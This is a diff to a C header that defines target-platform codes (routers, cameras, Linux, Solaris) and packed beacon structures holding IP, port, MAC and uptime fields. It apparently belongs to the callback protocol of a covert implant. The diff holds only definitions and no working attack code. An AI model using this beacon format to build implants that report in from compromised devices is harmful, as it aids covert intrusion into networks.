@@ -17,14 +17,15 @@
 #define	BH_WINDOWS			10	// No longer supported
 #define BH_LINUX_X86		20
 #define BH_LINUX_X86_64		21
-#define BH_SOLARIS_SPARC	30
+#define BH_SOLARIS_SPARC	30	// No longer supported
 #define BH_SOLARIS_X86		31
 #define BH_MIKROTIK_MIPS	40	// MIPS (Big Endian)
-#define BH_MIKROTIK_MIPSEL	41	// MIPS (Little Endian)
+#define BH_MIKROTIK_MIPSEL	41	// MIPS (Little Endian) - No longer supported
 #define BH_MIKROTIK_X86		42
 #define BH_MIKROTIK_PPC		43
 #define BH_UBIQUITI_MIPS	50	// MIPS (Big Endian)
 #define BH_ARM				60
+#define BH_AVTECH_ARM		61
 
 //Header types
 #define MAC					1
@@ -48,7 +49,7 @@
  * @var interval - Time to wait in between beacons
  */
 
-typedef struct _BEACON_INFO
+typedef struct __attribute__((packed)) _BEACON_INFO
 {
 	char *ip;
 	int port;
@@ -59,7 +60,7 @@ typedef struct _BEACON_INFO
 } BEACONINFO;
 
 
-typedef struct beacon_field
+typedef struct __attribute__((packed)) beacon_field
 {
 	unsigned char mac[20];
 	unsigned long uptime;
@@ -67,19 +68,19 @@ typedef struct beacon_field
 } BEACONFIELD;
 
 
-typedef struct beacon_header
+typedef struct __attribute__((packed)) beacon_header
 {
 	unsigned short version;
 	unsigned short os;
 } BEACON_HDR;
 
-typedef struct add_header
+typedef struct __attribute__((packed)) add_header
 {
 	unsigned short type;
 	unsigned short length;
 }ADD_HDR;
 
-typedef struct ssl_hdr
+typedef struct __attribute__((packed)) ssl_hdr
 {
 	unsigned char type;
 	unsigned short version;
